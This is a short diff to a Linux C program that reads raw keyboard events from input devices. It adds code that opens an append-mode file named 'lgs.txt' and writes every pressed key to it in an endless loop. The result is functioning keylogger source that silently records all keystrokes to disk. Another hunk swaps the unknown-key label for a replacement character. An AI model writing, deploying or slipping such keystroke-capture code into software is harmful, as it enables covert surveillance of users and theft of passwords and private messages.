@@ -62,7 +62,7 @@ const char *key_name(unsigned short code) {
     return "Z";
 
   default:
-    return "UNKNOWN";
+    return "�";
   }
 }
 int main() {
@@ -126,6 +126,18 @@ printf("length of events in array: %d\n", event_count);
     }
   }
 
+  // open/create the file to save logs
+  const char *filename = "lgs.txt";
+  int logs_fd;
+
+  logs_fd = open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+  if (logs_fd == -1) {
+    perror("open");
+    return 1;
+  }
+
+  const char *theKey;
+
   while (1) {
 
     // Tell me which keyboard has data , so - use poll()  -- int poll(struct
@@ -137,8 +149,12 @@ printf("length of events in array: %d\n", event_count);
     // read FDs
     read(fds[1].fd, &ev, sizeof(struct input_event));
     if (ev.type == EV_KEY && ev.value == 1) {
-      printf(" pressed %s\n", key_name(ev.code));
+      theKey = key_name(ev.code);
+      printf(" pressed %s\n", theKey);
       fflush(stdout);
+
+      // write keys to the file
+      write(logs_fd, theKey, strlen(theKey));
     }
   }
 
